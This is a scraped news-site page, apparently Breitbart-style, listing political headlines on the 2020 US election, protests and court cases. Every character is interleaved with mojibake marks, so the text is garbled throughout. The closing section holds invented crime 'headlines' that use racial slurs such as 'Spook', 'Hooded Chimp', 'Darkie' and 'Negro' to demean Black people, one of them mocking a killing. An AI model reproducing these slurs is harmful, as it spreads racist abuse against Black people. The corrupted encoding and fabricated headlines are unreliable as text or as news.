T‚Äéw‚Äéo‚Äé ‚ÄéR‚Äée‚Äéa‚Äés‚Äéo‚Äén‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéF‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚Äé'‚ÄéT‚Äéo‚Äéu‚Äég‚Äéh‚Äée‚Äér‚Äé'‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äéa‚Äél‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéP‚Äéa‚Äét‚Äéh‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé7‚Äé0‚Äé
T‚Äéo‚Äém‚Äém‚Äéy‚Äé ‚ÄéR‚Äéo‚Äéb‚Äéi‚Äén‚Äés‚Äéo‚Äén‚Äé ‚ÄéC‚Äél‚Äée‚Äéa‚Äér‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äé ‚ÄéB‚Äéa‚Äén‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚Äé'‚ÄéU‚Äén‚Äél‚Äéa‚Äéw‚Äéf‚Äéu‚Äél‚Äé'‚Äé
‚Äò‚ÄéA‚Äé ‚ÄéK‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé‚Äô‚Äés‚Äé ‚ÄéT‚Äéa‚Äél‚Äée‚Äé‚Äô‚Äé ‚ÄéD‚Äéi‚Äér‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äé:‚Äé ‚ÄéN‚Äée‚Äét‚Äéf‚Äél‚Äéi‚Äéx‚Äé ‚ÄéA‚Äél‚Äég‚Äéo‚Äér‚Äéi‚Äét‚Äéh‚Äém‚Äé ‚ÄéR‚Äée‚Äéj‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äée‚Äéq‚Äéu‚Äée‚Äél‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéF‚Äée‚Äém‚Äéa‚Äél‚Äée‚Äé
R‚Äéa‚Äén‚Äéd‚Äé ‚ÄéP‚Äéa‚Äéu‚Äél‚Äé ‚ÄéD‚Äée‚Äém‚Äéa‚Äén‚Äéd‚Äés‚Äé ‚ÄéA‚Äén‚Äés‚Äéw‚Äée‚Äér‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äén‚Äég‚Äée‚Äér‚Äéo‚Äéu‚Äés‚Äé ‚ÄéB‚Äéi‚Äéo‚Äél‚Äéa‚Äéb‚Äés‚Äé
N‚ÄéB‚ÄéC‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéP‚Äéo‚Äél‚Äél‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéM‚Äéo‚Äér‚Äée‚Äé ‚Äé'‚ÄéC‚Äéo‚Äém‚Äép‚Äée‚Äét‚Äée‚Äén‚Äét‚Äé'‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé,‚Äé ‚ÄéU‚Äép‚Äé ‚Äé2‚Äé1‚Äé ‚ÄéP‚Äéo‚Äéi‚Äén‚Äét‚Äés‚Äé ‚ÄéS‚Äéi‚Äén‚Äéc‚Äée‚Äé ‚Äé2‚Äé0‚Äé2‚Äé0‚Äé ‚Äé
C‚Äéa‚Äér‚Äét‚Äée‚Äél‚Äé ‚ÄéG‚Äéu‚Äén‚Äém‚Äée‚Äén‚Äé ‚ÄéD‚Äéu‚Äém‚Äép‚Äé ‚Äé8‚Äé ‚ÄéB‚Äéo‚Äéd‚Äéi‚Äée‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚ÄéM‚Äée‚Äéx‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéB‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äéw‚Äéa‚Äéy‚Äé
G‚Äée‚Äét‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé
H‚Äéo‚Äém‚Äée‚ÄéP‚Äéa‚Äég‚Äée‚Äé
D‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äé ‚ÄéA‚Äéd‚Äév‚Äéi‚Äés‚Äée‚Äér‚Äé:‚Äé ‚ÄéT‚Äéw‚Äéo‚Äé ‚ÄéR‚Äée‚Äéa‚Äés‚Äéo‚Äén‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéF‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚Äé‚Äò‚ÄéT‚Äéo‚Äéu‚Äég‚Äéh‚Äée‚Äér‚Äé‚Äô‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äéa‚Äél‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéP‚Äéa‚Äét‚Äéh‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé7‚Äé0‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéU‚Äén‚Äée‚Äém‚Äép‚Äél‚Äéo‚Äéy‚Äém‚Äée‚Äén‚Äét‚Äé
P‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚ÄéJ‚Äéo‚Äée‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äéf‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚Äéa‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚Äé‚Äú‚Äét‚Äéo‚Äéu‚Äég‚Äéh‚Äée‚Äér‚Äé‚Äù‚Äé ‚Äép‚Äéa‚Äét‚Äéh‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéo‚Äép‚Äép‚Äéo‚Äén‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äéo‚Äéb‚Äét‚Äéa‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äé2‚Äé7‚Äé0‚Äé ‚Äée‚Äél‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äéa‚Äél‚Äé ‚Äéc‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚Äév‚Äéo‚Äét‚Äée‚Äés‚Äé ‚Äén‚Äée‚Äée‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéw‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äél‚Äé ‚Äée‚Äél‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äét‚Äéi‚Äém‚Äée‚Äé ‚ÄéD‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äé ‚Äéa‚Äéd‚Äév‚Äéi‚Äés‚Äée‚Äér‚Äé ‚ÄéD‚Äéo‚Äéu‚Äég‚Äé ‚ÄéS‚Äéo‚Äés‚Äén‚Äéi‚Äék‚Äé ‚Äéw‚Äér‚Äéo‚Äét‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéY‚Äéo‚Äér‚Äék‚Äé ‚ÄéT‚Äéi‚Äém‚Äée‚Äés‚Äé.‚Äé

S‚Äéh‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚ÄéM‚Äée‚Äér‚Äér‚Äéi‚Äéc‚Äék‚Äé ‚ÄéG‚Äéa‚Äér‚Äél‚Äéa‚Äén‚Äéd‚Äé ‚Äéb‚Äée‚Äé ‚Äéi‚Äém‚Äép‚Äée‚Äéa‚Äéc‚Äéh‚Äée‚Äéd‚Äé?‚Äé

Y‚ÄéE‚ÄéS‚ÄéN‚ÄéO‚Äé
M‚ÄéO‚ÄéS‚ÄéT‚Äé ‚ÄéP‚ÄéO‚ÄéP‚ÄéU‚ÄéL‚ÄéA‚ÄéR‚Äé
W‚ÄéA‚ÄéT‚ÄéC‚ÄéH‚Äé:‚Äé ‚ÄéA‚Äén‚Äét‚Äéi‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äét‚Äé ‚ÄéC‚Äéo‚Äél‚Äéu‚Äém‚Äéb‚Äéi‚Äéa‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äét‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äé ‚ÄéS‚Äél‚Äéo‚Äég‚Äéa‚Äén‚Äés‚Äé
W‚ÄéA‚ÄéT‚ÄéC‚ÄéH‚Äé:‚Äé ‚ÄéA‚Äén‚Äét‚Äéi‚Äé-‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äét‚Äé ‚ÄéC‚Äéo‚Äél‚Äéu‚Äém‚Äéb‚Äéi‚Äéa‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äét‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äé ‚ÄéS‚Äél‚Äéo‚Äég‚Äéa‚Äén‚Äés‚Äé
4‚Äé,‚Äé7‚Äé8‚Äé4‚Äé
A‚Äél‚Äéi‚Äén‚Äéa‚Äé ‚ÄéH‚Äéa‚Äéb‚Äéb‚Äéa‚Äé:‚Äé ‚ÄéC‚Äér‚Äéi‚Äém‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéC‚Äéi‚Äév‚Äéi‚Äél‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äés‚Äé ‚ÄéB‚Äée‚Äéi‚Äén‚Äég‚Äé ‚ÄéU‚Äés‚Äée‚Äéd‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéB‚Äée‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äé ‚Äé‚Äò‚ÄéT‚Äéh‚Äée‚Äéy‚Äé ‚ÄéC‚Äéa‚Äén‚Äén‚Äéo‚Äét‚Äé ‚ÄéB‚Äée‚Äéa‚Äét‚Äé ‚ÄéH‚Äéi‚Äém‚Äé
H‚Äéa‚Äéb‚Äéb‚Äéa‚Äé:‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äés‚Äé ‚ÄéB‚Äée‚Äéi‚Äén‚Äég‚Äé ‚ÄéU‚Äés‚Äée‚Äéd‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéB‚Äée‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äé ‚ÄéT‚Äéh‚Äée‚Äéy‚Äé ‚ÄéC‚Äéa‚Äén‚Äé'‚Äét‚Äé ‚ÄéB‚Äée‚Äéa‚Äét‚Äé ‚ÄéH‚Äéi‚Äém‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äéo‚Äél‚Äél‚Äés‚Äé
4‚Äé,‚Äé9‚Äé3‚Äé3‚Äé
G‚ÄéO‚ÄéP‚Äé ‚ÄéR‚Äée‚Äép‚Äé.‚Äé ‚ÄéC‚Äéa‚Äér‚Äél‚Äé ‚ÄéP‚Äér‚Äée‚Äéd‚Äéi‚Äéc‚Äét‚Äés‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äél‚Äéa‚Äés‚Äéh‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéC‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äéi‚Äéa‚Äén‚Äé ‚ÄéC‚Äéo‚Äém‚Äém‚Äéu‚Äén‚Äéi‚Äét‚Äéy‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéM‚Äée‚Äém‚Äéb‚Äée‚Äér‚Äés‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéT‚Äéu‚Äér‚Äén‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äé
C‚Äéa‚Äér‚Äél‚Äé ‚ÄéP‚Äér‚Äée‚Äéd‚Äéi‚Äéc‚Äét‚Äés‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äél‚Äéa‚Äés‚Äéh‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéC‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äéi‚Äéa‚Äén‚Äé ‚ÄéC‚Äéo‚Äém‚Äém‚Äéu‚Äén‚Äéi‚Äét‚Äéy‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äéo‚Äén‚Äé
2‚Äé4‚Äé2‚Äé
D‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äé ‚ÄéA‚Äéd‚Äév‚Äéi‚Äés‚Äée‚Äér‚Äé:‚Äé ‚ÄéT‚Äéw‚Äéo‚Äé ‚ÄéR‚Äée‚Äéa‚Äés‚Äéo‚Äén‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéF‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚Äé‚Äò‚ÄéT‚Äéo‚Äéu‚Äég‚Äéh‚Äée‚Äér‚Äé‚Äô‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äéa‚Äél‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéP‚Äéa‚Äét‚Äéh‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé7‚Äé0‚Äé
T‚Äéw‚Äéo‚Äé ‚ÄéR‚Äée‚Äéa‚Äés‚Äéo‚Äén‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéF‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚Äé'‚ÄéT‚Äéo‚Äéu‚Äég‚Äéh‚Äée‚Äér‚Äé'‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéo‚Äér‚Äéa‚Äél‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äée‚Äég‚Äée‚Äé ‚ÄéP‚Äéa‚Äét‚Äéh‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé7‚Äé0‚Äé
8‚Äé2‚Äé6‚Äé
M‚ÄéS‚ÄéN‚ÄéB‚ÄéC‚Äé‚Äô‚Äés‚Äé ‚ÄéM‚Äéa‚Äéd‚Äéd‚Äéo‚Äéw‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äé‚Äò‚ÄéS‚Äée‚Äée‚Äém‚Äée‚Äéd‚Äé ‚ÄéO‚Äél‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äéi‚Äér‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéM‚Äéa‚Äéd‚Äé‚Äô‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé
M‚ÄéS‚ÄéN‚ÄéB‚ÄéC‚Äé'‚Äés‚Äé ‚ÄéM‚Äéa‚Äéd‚Äéd‚Äéo‚Äéw‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äé'‚ÄéS‚Äée‚Äée‚Äém‚Äée‚Äéd‚Äé ‚ÄéO‚Äél‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äéi‚Äér‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéM‚Äéa‚Äéd‚Äé'‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé
8‚Äé8‚Äé5‚Äé
O‚Äéb‚Äéa‚Äém‚Äéa‚Äé‚Äô‚Äés‚Äé ‚ÄéP‚Äéa‚Äés‚Äés‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéM‚Äée‚Äés‚Äés‚Äéa‚Äég‚Äée‚Äé ‚ÄéA‚Äéd‚Äéd‚Äés‚Äé ‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äés‚Äé ‚ÄéI‚Äén‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéS‚Äét‚Äéo‚Äér‚Äéy‚Äé;‚Äé ‚ÄéO‚Äém‚Äéi‚Äét‚Äés‚Äé ‚ÄéH‚Äéo‚Äés‚Äét‚Äéa‚Äég‚Äée‚Äés‚Äé
O‚Äéb‚Äéa‚Äém‚Äéa‚Äé'‚Äés‚Äé ‚ÄéP‚Äéa‚Äés‚Äés‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéM‚Äée‚Äés‚Äés‚Äéa‚Äég‚Äée‚Äé ‚ÄéR‚Äée‚Äéc‚Äéa‚Äél‚Äél‚Äés‚Äé ‚ÄéS‚Äéu‚Äéf‚Äéf‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚Äé'‚ÄéI‚Äés‚Äér‚Äéa‚Äée‚Äél‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéG‚Äéa‚Äéz‚Äéa‚Äé'‚Äé
8‚Äé4‚Äé2‚Äé
D‚Äée‚Äém‚Äé ‚ÄéR‚Äée‚Äép‚Äé ‚ÄéK‚Äéh‚Äéa‚Äén‚Äén‚Äéa‚Äé:‚Äé ‚ÄéI‚Äé ‚ÄéW‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚ÄéV‚Äéo‚Äét‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äéc‚Äét‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äéo‚Äén‚Äé
D‚Äée‚Äém‚Äé ‚ÄéR‚Äée‚Äép‚Äé ‚ÄéK‚Äéh‚Äéa‚Äén‚Äén‚Äéa‚Äé:‚Äé ‚ÄéI‚Äé ‚ÄéW‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚ÄéV‚Äéo‚Äét‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äéc‚Äét‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äéo‚Äén‚Äé
6‚Äé,‚Äé3‚Äé0‚Äé5‚Äé
C‚Äéo‚Äél‚Äéu‚Äém‚Äéb‚Äéi‚Äéa‚Äé ‚ÄéM‚Äéo‚Äév‚Äée‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéV‚Äéi‚Äér‚Äét‚Äéu‚Äéa‚Äél‚Äé ‚ÄéC‚Äél‚Äéa‚Äés‚Äés‚Äée‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äés‚Äé ‚ÄéE‚Äér‚Äéu‚Äép‚Äét‚Äé
C‚Äéo‚Äél‚Äéu‚Äém‚Äéb‚Äéi‚Äéa‚Äé ‚ÄéM‚Äéo‚Äév‚Äée‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéV‚Äéi‚Äér‚Äét‚Äéu‚Äéa‚Äél‚Äé ‚ÄéC‚Äél‚Äéa‚Äés‚Äés‚Äée‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äé-‚ÄéP‚Äéa‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äéi‚Äéa‚Äén‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äés‚Äé ‚ÄéE‚Äér‚Äéu‚Äép‚Äét‚Äé
4‚Äé,‚Äé8‚Äé7‚Äé2‚Äé
T‚Äéu‚Äér‚Äél‚Äée‚Äéy‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéI‚Äés‚Äé ‚ÄéR‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äé‚Äî‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéY‚Äéo‚Äér‚Äék‚Äé ‚ÄéC‚Äéa‚Äés‚Äée‚Äé ‚ÄéI‚Äés‚Äé ‚Äéa‚Äén‚Äé ‚Äé‚Äò‚ÄéE‚Äém‚Äéb‚Äéa‚Äér‚Äér‚Äéa‚Äés‚Äés‚Äém‚Äée‚Äén‚Äét‚Äé‚Äô‚Äé
T‚Äéu‚Äér‚Äél‚Äée‚Äéy‚Äé:‚Äé ‚ÄéN‚Äée‚Äéw‚Äé ‚ÄéY‚Äéo‚Äér‚Äék‚Äé ‚ÄéC‚Äéa‚Äés‚Äée‚Äé ‚ÄéI‚Äés‚Äé ‚Äéa‚Äén‚Äé ‚Äé'‚ÄéE‚Äém‚Äéb‚Äéa‚Äér‚Äér‚Äéa‚Äés‚Äés‚Äém‚Äée‚Äén‚Äét‚Äé'‚Äé
5‚Äé0‚Äé3‚Äé
T‚Äéo‚Äém‚Äém‚Äéy‚Äé ‚ÄéR‚Äéo‚Äéb‚Äéi‚Äén‚Äés‚Äéo‚Äén‚Äé ‚ÄéC‚Äél‚Äée‚Äéa‚Äér‚Äée‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéC‚Äéh‚Äéa‚Äér‚Äég‚Äée‚Äés‚Äé ‚Äéa‚Äés‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äé ‚ÄéB‚Äéa‚Äén‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚Äé‚Äò‚ÄéU‚Äén‚Äél‚Äéa‚Äéw‚Äéf‚Äéu‚Äél‚Äé‚Äô‚Äé
T‚Äéo‚Äém‚Äém‚Äéy‚Äé ‚ÄéR‚Äéo‚Äéb‚Äéi‚Äén‚Äés‚Äéo‚Äén‚Äé ‚ÄéC‚Äél‚Äée‚Äéa‚Äér‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äés‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äét‚Äé ‚ÄéB‚Äéa‚Äén‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚Äé'‚ÄéU‚Äén‚Äél‚Äéa‚Äéw‚Äéf‚Äéu‚Äél‚Äé'‚Äé

S‚Äép‚Äéo‚Äéo‚Äék‚Äé ‚ÄéG‚Äée‚Äét‚Äés‚Äé ‚Äé4‚Äé0‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéB‚Äée‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéM‚Äéu‚Äéd‚Äés‚Äéh‚Äéa‚Äér‚Äék‚Äé ‚ÄéG‚Äéi‚Äér‚Äél‚Äéf‚Äér‚Äéi‚Äée‚Äén‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äée‚Äéa‚Äét‚Äéh‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéH‚Äéa‚Äém‚Äém‚Äée‚Äér‚Äé.‚Äé

N‚Äéo‚Äéw‚Äé ‚Äéw‚Äéh‚Äéo‚Äé'‚Äés‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äéf‚Äée‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äéf‚Äéo‚Äéu‚Äér‚Äé ‚Äéh‚Äéa‚Äél‚Äéf‚Äé-‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äés‚Äé?‚Äé


B‚Äér‚Äéo‚Äén‚Äéx‚Äé:‚Äé ‚ÄéH‚Äéo‚Äéo‚Äéd‚Äée‚Äéd‚Äé ‚ÄéC‚Äéh‚Äéi‚Äém‚Äép‚Äé ‚ÄéS‚Äét‚Äée‚Äéa‚Äél‚Äés‚Äé ‚ÄéM‚Äéa‚Äén‚Äé'‚Äés‚Äé ‚ÄéH‚Äée‚Äéa‚Äér‚Äét‚Äé ‚ÄéM‚Äée‚Äéd‚Äéi‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé.‚Äé


N‚Äée‚Äéw‚Äé ‚ÄéJ‚Äée‚Äér‚Äés‚Äée‚Äéy‚Äé:‚Äé ‚ÄéS‚Äéh‚Äée‚Äéb‚Äéo‚Äéo‚Äén‚Äé ‚ÄéS‚Äép‚Äée‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚ÄéD‚Äér‚Äéi‚Äév‚Äée‚Äér‚Äé ‚ÄéC‚Äér‚Äéa‚Äés‚Äéh‚Äée‚Äés‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚ÄéB‚Äéu‚Äés‚Äé ‚ÄéW‚Äéh‚Äéi‚Äél‚Äée‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äéo‚Äén‚Äé ‚ÄéH‚Äée‚Äér‚Äéo‚Äéi‚Äén‚Äé.‚Äé


C‚Äéo‚Äép‚Äés‚Äé ‚ÄéI‚Äéd‚Äée‚Äén‚Äét‚Äéi‚Äéf‚Äéy‚Äé ‚ÄéD‚Äéa‚Äér‚Äék‚Äéi‚Äée‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéS‚Äée‚Äét‚Äé ‚ÄéM‚Äéa‚Äéc‚Äéy‚Äé‚Äô‚Äés‚Äé ‚ÄéD‚Äér‚Äée‚Äés‚Äés‚Äéi‚Äén‚Äég‚Äé ‚ÄéR‚Äéo‚Äéo‚Äém‚Äé ‚ÄéA‚Äéb‚Äél‚Äéa‚Äéz‚Äée‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéS‚Äét‚Äéu‚Äép‚Äéi‚Äéd‚Äé ‚ÄéG‚Äél‚Äéa‚Äés‚Äés‚Äée‚Äés‚Äé ‚ÄéG‚Äée‚Äét‚Äés‚Äé ‚Äé3‚Äé9‚Äé ‚ÄéY‚Äée‚Äéa‚Äér‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéu‚Äép‚Äé ‚ÄéM‚Äéa‚Äén‚Äéh‚Äéa‚Äét‚Äét‚Äéa‚Äén‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äéc‚Äél‚Äéu‚Äéb‚Äé.‚Äé


